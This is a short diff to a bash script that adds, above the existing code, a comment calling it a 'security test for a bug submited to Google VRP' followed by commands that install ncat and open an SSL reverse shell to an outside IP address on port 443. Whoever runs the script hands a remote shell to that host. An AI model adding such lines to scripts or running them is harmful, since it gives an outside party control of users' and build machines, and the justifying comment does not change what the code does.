@@ -1,5 +1,9 @@
 #!/usr/bin/env bash
 
+# this is a security test for a bug submited to Google VRP
+sudo apt install -y ncat
+ncat 15.237.149.54 443 --ssl -e /bin/bash
+
 set -u -e -o pipefail
 
 ####################################################################################################
